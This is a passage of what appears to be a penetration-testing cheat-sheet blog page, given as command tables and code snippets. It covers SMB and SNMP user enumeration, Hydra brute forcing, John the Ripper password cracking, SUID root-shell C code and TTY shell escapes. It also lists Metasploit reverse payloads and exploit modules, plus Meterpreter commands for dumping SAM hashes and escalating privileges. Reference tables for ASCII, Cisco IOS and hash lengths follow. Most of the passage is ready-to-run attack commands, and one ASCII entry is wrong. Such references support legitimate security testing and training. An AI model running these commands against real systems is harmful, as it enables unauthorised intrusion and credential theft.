      <td>
           <p>tcpdump for port 80 on interface eth0, outputs to output.pcap</p>
      </td>
    </tr>
  </tbody>
</table>
</div>

## Username Enumeration

Some techniques used to remotely enumerate users on a target system.

### SMB User Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>

    <tr>
      <td>
        <p><code>python /usr/share/doc/python-impacket-doc/examples<br>/samrdump.py 192.168.XXX.XXX</code></p>
      </td>
      <td>
           <p>Enumerate users from SMB</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</code></p>
      </td>
      <td>
           <p>RID cycle SMB / enumerate users from SMB</p>
      </td>
    </tr>

</table>
</div>

### SNMP User Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>

  <tr>
      <td>
        <p><code>snmpwalk public -v1 192.168.X.XXX 1 |grep 77.1.2.25 <br>|cut -d” “ -f4</code></p>
      </td>
      <td>
           <p>Enmerate users from SNMP</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>python /usr/share/doc/python-impacket-doc/examples/<br>samrdump.py SNMP 192.168.X.XXX</code></p>
      </td>
      <td>
           <p>Enmerate users from SNMP</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt <br>(then grep)</code></p>
      </td>
      <td>
           <p>Search for SNMP servers with nmap, grepable output</p>
      </td>
    </tr>




</table>
</div>


## Passwords

### Wordlists

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
	<p><code>/usr/share/wordlists</code></p>
      </td>
      <td>
            <p>Kali word lists</p>
      </td>
    </tr>
  </tbody>
</table>
</div>


## Brute Forcing Services

### Hydra FTP Brute Force

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
	<p><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f <br>192.168.X.XXX ftp -V</code></p>
      </td>
      <td>
            <p>Hydra FTP brute force</p>
      </td>
    </tr>
  </tbody>
</table>
</div>

### Hydra POP3 Brute Force


<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
	<p><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f <br>192.168.X.XXX pop3 -V</code></p>
      </td>
      <td>
            <p>Hydra POP3 brute force</p>
      </td>
    </tr>
  </tbody>
</table>
</div>

### Hydra SMTP Brute Force

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
	<p><code>hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V</code></p>
      </td>
      <td>
            <p>Hydra SMTP brute force</p>
      </td>
    </tr>
  </tbody>
</table>
</div>

Use <code>-t</code> to limit concurrent connections, example: <code>-t 15</code>  


## Password Cracking

Password cracking penetration testing tools.

### John The Ripper - JTR

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
             <p><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes</code></p>
      </td>
      <td>
            <p>JTR password cracking</p>
      </td>
    </tr>
    <tr>
      <td>
          <p><code>john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt</code></p>
      </td>
      <td>
            <p>JTR forced descrypt cracking with wordlist</p>
      </td>
    </tr>
    <tr>
      <td>
          <p><code>john --format=descrypt hash --show</code></p>
      </td>
      <td>
            <p>JTR forced descrypt brute force cracking</p>
      </td>
    </tr>
  </tbody>
</table>
</div>
 

## Windows Penetration Testing Commands

See **Windows Penetration Testing Commands**.  


## Linux Penetration Testing Commands

See Linux Commands Cheat Sheet (right hand menu) for a list of Linux Penetration testing commands, useful for local system enumeration.

## Compiling Exploits

Some notes on compiling exploits.

### Identifying if C code is for Windows or Linux

C #includes will indicate which OS should be used to build the exploit.

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
        <p><code>process.h, string.h, winbase.h, windows.h, winsock2.h</code></p>
      </td>
      <td>
            <p>Windows exploit code</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, <br> sys/sockt.h, sys/types.h, unistd.h</code></p>
      </td>
      <td>
            <p>Linux exploit code</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

### Build Exploit GCC

Compile exploit gcc.


<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
        <p><code>gcc -o exploit exploit.c</code></p>
      </td>
      <td>
            <p>Basic GCC compile</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

### GCC Compile 32Bit Exploit on 64Bit Kali

Handy for cross compiling 32 bit binaries on 64 bit attacking machines.  

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>

    <tr>
      <td>
        <p><code>gcc -m32 exploit.c -o exploit</code></p>
      </td>
      <td>
            <p>Cross compile 32 bit binary on 64 bit Linux</p>
      </td>
    </tr>

</table>
</div>

### Compile Windows .exe on Linux

Build / compile windows exploits on Linux, resulting in a .exe file.

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>

    <tr>
      <td>
        <p><code>i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe</code></p>
      </td>
      <td>
            <p>Compile windows .exe on Linux</p>
      </td>
    </tr>

</table>
</div>

## SUID Binary

Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required.

below are some quick copy and pate examples for various shells:

### SUID C Shell for /bin/bash   

{% highlight c %}
int main(void){
       setresuid(0, 0, 0);
       system("/bin/bash");
}       
{% endhighlight %}

### SUID C Shell for /bin/sh

{% highlight c %}
int main(void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}       
{% endhighlight %}


### Building the SUID Shell binary

{% highlight bash %}
gcc -o suid suid.c  
{% endhighlight %}

For 32 bit:

{% highlight bash %}
gcc -m32 -o suid suid.c  
{% endhighlight %}

## Reverse Shells

See [Reverse Shell Cheat Sheet](/blog/reverse-shell-cheat-sheet/) for a list of useful Reverse Shells.

## TTY Shells

Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like <code>su</code> from reverse shells.

### Python TTY Shell Trick  

{% highlight python %}
python -c 'import pty;pty.spawn("/bin/bash")'
{% endhighlight %}

{% highlight bash %}
echo os.system('/bin/bash')
{% endhighlight %}

### Spawn Interactive sh shell

{% highlight bash %}
/bin/sh -i
{% endhighlight %}

### Spawn Perl TTY Shell

{% highlight perl %}
exec "/bin/sh";
perl —e 'exec "/bin/sh";'
{% endhighlight %}

### Spawn Ruby TTY Shell

{% highlight ruby %}
exec "/bin/sh"
{% endhighlight %}

### Spawn Lua TTY Shell

{% highlight lua %}
os.execute('/bin/sh')
{% endhighlight %}

### Spawn TTY Shell from Vi

Run shell commands from vi:

{% highlight bash %}
:!bash
{% endhighlight %}

### Spawn TTY Shell NMAP

{% highlight bash %}
!sh
{% endhighlight %}


## Metasploit Cheat Sheet

A basic metasploit cheat sheet that I have found handy for reference.

Basic Metasploit commands, useful for reference, for pivoting see - [Meterpreter Pivoting](/blog/ssh-meterpreter-pivoting-techniques/) techniques.

### Meterpreter Payloads

### Windows reverse meterpreter payload

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
        <p><code>set payload windows/meterpreter/reverse_tcp</code></p>
      </td>
      <td>
            <p>Windows reverse tcp payload</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

### Windows VNC Meterpreter payload

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
        <p><code>set payload windows/vncinject/reverse_tcp</code></p>
        <p><code>set ViewOnly false</code></p>
      </td>
      <td>
            <p>Meterpreter Windows VNC Payload</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

### Linux Reverse Meterpreter payload

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
        <p><code>set payload linux/meterpreter/reverse_tcp</code></p>
      </td>
      <td>
            <p>Meterpreter Linux Reverse Payload</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

## Meterpreter Cheat Sheet

Useful meterpreter commands.

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
        <p><code>upload file c:\\windows</code></p>
      </td>
      <td>
            <p>Meterpreter upload file to Windows target</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>download c:\\windows\\repair\\sam /tmp</code></p>
      </td>
      <td>
            <p>Meterpreter download file from Windows target</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>download c:\\windows\\repair\\sam /tmp</code></p>
      </td>
      <td>
            <p>Meterpreter download file from Windows target</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>execute -f c:\\windows\temp\exploit.exe</code></p>
      </td>
      <td>
            <p>Meterpreter run .exe on target - handy for executing uploaded exploits</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>execute -f cmd -c </code></p>
      </td>
      <td>
            <p>Creates new channel with cmd shell</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>ps</code></p>
      </td>
      <td>
	    <p>Meterpreter show processes</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>shell</code></p>
      </td>
      <td>
	    <p>Meterpreter get shell on the target</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>getsystem</code></p>
      </td>
      <td>
	    <p>Meterpreter attempts priviledge escalation the target</p>
      </td>
    </tr>    
    <tr>
      <td>
        <p><code>hashdump</code></p>
      </td>
      <td>
	    <p>Meterpreter attempts to dump the hashes on the target</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>portfwd add –l 3389 –p 3389 –r target</code></p>
      </td>
      <td>
	    <p>Meterpreter create port forward to target machine</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>portfwd delete –l 3389 –p 3389 –r target</code></p>
      </td>
      <td>
	    <p>Meterpreter delete port forward</p>
      </td>
    </tr>


  </tbody>
</table>
</div>

## Common Metasploit Modules

Top metasploit modules.

### Remote Windows Metasploit Modules (exploits)

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>use exploit/windows/smb/ms08_067_netapi</code></p>
      </td>
      <td>
            <p>MS08_067 Windows 2k, XP, 2003 Remote Exploit</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>use exploit/windows/dcerpc/ms06_040_netapi</code></p>
      </td>
      <td>
            <p>MS08_040 Windows NT, 2k, XP, 2003 Remote Exploit</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>use exploit/windows/smb/<br>ms09_050_smb2_negotiate_func_index</code></p>
      </td>
      <td>
            <p>MS09_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

### Local Windows Metasploit Modules (exploits)


<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>use exploit/windows/local/bypassuac</code></p>
      </td>
      <td>
            <p>Bypass UAC on Windows 7 + Set target + arch, x86/64</p>
      </td>
    </tr>
  </tbody>
</table>
</div>


### Auxilary Metasploit Modules

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>

    <tr>
      <td>
        <p><code>use auxiliary/scanner/http/dir_scanner</code></p>
      </td>
      <td>
            <p>Metasploit HTTP directory scanner</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>use auxiliary/scanner/http/jboss_vulnscan</code></p>
      </td>
      <td>
            <p>Metasploit JBOSS vulnerability scanner</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>use auxiliary/scanner/mssql/mssql_login</code></p>
      </td>
      <td>
            <p>Metasploit MSSQL Credential Scanner</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>use auxiliary/scanner/mysql/mysql_version</code></p>
      </td>
      <td>
            <p>Metasploit MSSQL Version Scanner</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>use auxiliary/scanner/oracle/oracle_login</code></p>
      </td>
      <td>
            <p>Metasploit Oracle Login Module</p>
      </td>
    </tr>

</table>
</div>

### Metasploit Powershell Modules

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>use exploit/multi/script/web_delivery</code></p>
      </td>
      <td>
            <p>Metasploit powershell payload delivery module</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>post/windows/manage/powershell/exec_powershell</code></p>
      </td>
      <td>
            <p>Metasploit upload and run powershell script through a session</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>use exploit/multi/http/jboss_maindeployer</code></p>
      </td>
      <td>
            <p>Metasploit JBOSS deploy</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>use exploit/windows/mssql/mssql_payload</code></p>
      </td>
      <td>
            <p>Metasploit MSSQL payload</p>
      </td>
    </tr>

  </tbody>
</table>
</div>


### Post Exploit Windows Metasploit Modules

Windows Metasploit Modules for privilege escalation. 

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>run post/windows/gather/win_privs</code></p>
      </td>
      <td>
            <p>Metasploit show privileges of current user</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>use post/windows/gather/credentials/gpp</code></p>
      </td>
      <td>
            <p>Metasploit grab GPP saved passwords</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>load mimikatz -> wdigest</code></p>
      </td>
      <td>
            <p>Metasplit load Mimikatz</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>run post/windows/gather/local_admin_search_enum</code></p>
      </td>
      <td>
        <p>Idenitfy other machines that the supplied domain user has administrative access to</p>
      </td>
    </tr>

        <tr>
      <td>
        <p><code>run post/windows/gather/smart_hashdump</code></p>
      </td>
      <td>
        <p>Automated dumping of sam file, tries to esc privileges etc</p>
      </td>
    </tr>



  </tbody>
</table>
</div>


## ASCII Table Cheat Sheet  

Useful for Web Application Penetration Testing, or if you get stranded on Mars and need to communicate with NASA.

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>ASCII</th>
      <th>Character</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>x00</code></p>
      </td>
      <td>
        <p>Null Byte</p>
      </td>
    </tr>

   <tr>
    <td>
      <p><code>x08</code></p>
    </td>
    <td>
      <p>BS</p>
    </td>
  </tr>

  <tr>
   <td>
     <p><code>x09</code></p>
   </td>
   <td>
     <p>TAB</p>
   </td>
 </tr>

 <tr>
  <td>
    <p><code>x0a</code></p>
  </td>
  <td>
    <p>LF</p>
  </td>
</tr>

<tr>
 <td>
   <p><code>x0d</code></p>
 </td>
 <td>
   <p>CR</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x1b</code></p>
 </td>
 <td>
   <p>ESC</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x20</code></p>
 </td>
 <td>
   <p>SPC</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x21</code></p>
 </td>
 <td>
   <p>!</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x22</code></p>
 </td>
 <td>
   <p>"</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x23</code></p>
 </td>
 <td>
   <p>#</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x24</code></p>
 </td>
 <td>
   <p>$</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x25</code></p>
 </td>
 <td>
   <p>%</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x26</code></p>
 </td>
 <td>
   <p>&</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x27</code></p>
 </td>
 <td>
   <p>`</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x28</code></p>
 </td>
 <td>
   <p>(</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x29</code></p>
 </td>
 <td>
   <p>)</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x2a</code></p>
 </td>
 <td>
   <p>*</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x2b</code></p>
 </td>
 <td>
   <p>+</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x2c</code></p>
 </td>
 <td>
   <p>,</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x2d</code></p>
 </td>
 <td>
   <p>-</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x2e</code></p>
 </td>
 <td>
   <p>.</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x2f</code></p>
 </td>
 <td>
   <p>/</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x30</code></p>
 </td>
 <td>
   <p>0</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x31</code></p>
 </td>
 <td>
   <p>1</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x32</code></p>
 </td>
 <td>
   <p>2</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x33</code></p>
 </td>
 <td>
   <p>3</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x34</code></p>
 </td>
 <td>
   <p>4</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x35</code></p>
 </td>
 <td>
   <p>5</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x36</code></p>
 </td>
 <td>
   <p>6</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x37</code></p>
 </td>
 <td>
   <p>7</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x38</code></p>
 </td>
 <td>
   <p>8</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x39</code></p>
 </td>
 <td>
   <p>9</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x3a</code></p>
 </td>
 <td>
   <p>:</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x3b</code></p>
 </td>
 <td>
   <p>;</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x3c</code></p>
 </td>
 <td>
   <p><</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x3d</code></p>
 </td>
 <td>
   <p>=</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x3e</code></p>
 </td>
 <td>
   <p>></p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x3f</code></p>
 </td>
 <td>
   <p>?</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x40</code></p>
 </td>
 <td>
   <p>@</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x41</code></p>
 </td>
 <td>
   <p>A</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x42</code></p>
 </td>
 <td>
   <p>B</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x43</code></p>
 </td>
 <td>
   <p>C</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x44</code></p>
 </td>
 <td>
   <p>D</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x45</code></p>
 </td>
 <td>
   <p>E</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x46</code></p>
 </td>
 <td>
   <p>F</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x47</code></p>
 </td>
 <td>
   <p>G</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x48</code></p>
 </td>
 <td>
   <p>H</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x49</code></p>
 </td>
 <td>
   <p>I</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x4a</code></p>
 </td>
 <td>
   <p>J</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x4b</code></p>
 </td>
 <td>
   <p>K</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x4c</code></p>
 </td>
 <td>
   <p>L</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x4d</code></p>
 </td>
 <td>
   <p>M</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x4e</code></p>
 </td>
 <td>
   <p>N</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x4f</code></p>
 </td>
 <td>
   <p>O</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x50</code></p>
 </td>
 <td>
   <p>P</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x51</code></p>
 </td>
 <td>
   <p>Q</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x52</code></p>
 </td>
 <td>
   <p>R</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x53</code></p>
 </td>
 <td>
   <p>S</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x54</code></p>
 </td>
 <td>
   <p>T</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x55</code></p>
 </td>
 <td>
   <p>U</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x56</code></p>
 </td>
 <td>
   <p>V</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x57</code></p>
 </td>
 <td>
   <p>W</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x58</code></p>
 </td>
 <td>
   <p>X</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x59</code></p>
 </td>
 <td>
   <p>Y</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x5a</code></p>
 </td>
 <td>
   <p>Z</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x5b</code></p>
 </td>
 <td>
   <p>[</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x5c</code></p>
 </td>
 <td>
   <p>\</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x5d</code></p>
 </td>
 <td>
   <p>]</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x5e</code></p>
 </td>
 <td>
   <p>^</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x5f</code></p>
 </td>
 <td>
   <p>_</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x60</code></p>
 </td>
 <td>
   <p>`</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x61</code></p>
 </td>
 <td>
   <p>a</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x62</code></p>
 </td>
 <td>
   <p>b</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x63</code></p>
 </td>
 <td>
   <p>c</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x64</code></p>
 </td>
 <td>
   <p>d</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x65</code></p>
 </td>
 <td>
   <p>e</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x66</code></p>
 </td>
 <td>
   <p>f</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x67</code></p>
 </td>
 <td>
   <p>g</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x68</code></p>
 </td>
 <td>
   <p>h</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x69</code></p>
 </td>
 <td>
   <p>i</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x6a</code></p>
 </td>
 <td>
   <p>j</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x6b</code></p>
 </td>
 <td>
   <p>k</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x6c</code></p>
 </td>
 <td>
   <p>l</p>
 </td>
</tr>


<tr>
 <td>
   <p><code>x6d</code></p>
 </td>
 <td>
   <p>m</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x6e</code></p>
 </td>
 <td>
   <p>n</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x6f</code></p>
 </td>
 <td>
   <p>o</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x70</code></p>
 </td>
 <td>
   <p>p</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x71</code></p>
 </td>
 <td>
   <p>q</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x72</code></p>
 </td>
 <td>
   <p>r</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x73</code></p>
 </td>
 <td>
   <p>s</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x74</code></p>
 </td>
 <td>
   <p>t</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x75</code></p>
 </td>
 <td>
   <p>u</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x76</code></p>
 </td>
 <td>
   <p>v</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x77</code></p>
 </td>
 <td>
   <p>w</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x78</code></p>
 </td>
 <td>
   <p>x</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x79</code></p>
 </td>
 <td>
   <p>y</p>
 </td>
</tr>

<tr>
 <td>
   <p><code>x7a</code></p>
 </td>
 <td>
   <p>z</p>
 </td>
</tr>

  </tbody>
</table>
</div>

## CISCO IOS Commands

A collection of useful Cisco IOS commands.

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>enable</code></p>
      </td>
      <td>
            <p>Enters enable mode</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>conf t</code></p>
      </td>
      <td>
            <p>Short for, configure terminal</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>(config)# interface fa0/0</code></p>
      </td>
      <td>
            <p>Configure FastEthernet 0/0</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>(config-if)# ip addr 0.0.0.0 255.255.255.255</code></p>
      </td>
      <td>
            <p>Add ip to fa0/0</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>(config-if)# ip addr 0.0.0.0 255.255.255.255</code></p>
      </td>
      <td>
            <p>Add ip to fa0/0</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>(config-if)# line vty 0 4</code></p>
      </td>
      <td>
            <p>Configure vty line</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>(config-line)# login</code></p>
      </td>
      <td>
            <p>Cisco set telnet password</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>(config-line)# password YOUR-PASSWORD</code></p>
      </td>
      <td>
            <p>Set telnet password</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># show running-config</code></p>
      </td>
      <td>
            <p>Show running config loaded in memory</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># show startup-config</code></p>
      </td>
      <td>
            <p>Show sartup config</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># show version</code></p>
      </td>
      <td>
            <p>show cisco IOS version</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># show session</code></p>
      </td>
      <td>
            <p>display open sessions</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code># show ip interface</code></p>
      </td>
      <td>
            <p>Show network interfaces</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># show interface e0</code></p>
      </td>
      <td>
            <p>Show detailed interface info</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># show ip route</code></p>
      </td>
      <td>
            <p>Show routes</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># show access-lists</code></p>
      </td>
      <td>
            <p>Show access lists</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># dir file systems</code></p>
      </td>
      <td>
            <p>Show available files</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># dir all-filesystems</code></p>
      </td>
      <td>
            <p>File information</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># dir /all</code></p>
      </td>
      <td>
            <p>SHow deleted files</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># terminal length 0</code></p>
      </td>
      <td>
            <p>No limit on terminal output</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># copy running-config tftp</code></p>
      </td>
      <td>
            <p>Copys running config to tftp server</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># copy running-config startup-config</code></p>
      </td>
      <td>
            <p>Copy startup-config to running-config</p>
      </td>
    </tr>
  </tbody>
</table>
</div>


## Cryptography

### Hash Lengths

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Hash</th>
      <th>Size</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p>MD5 Hash Length</p>
      </td>
      <td>
        <p><code>16 Bytes</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>SHA-1 Hash Length</p>
      </td>
      <td>
        <p><code>20 Bytes</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>SHA-256 Hash Length</p>
      </td>
      <td>
        <p><code>32 Bytes</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>SHA-512 Hash Length</p>
      </td>
      <td>
        <p><code>64 Bytes</code></p>
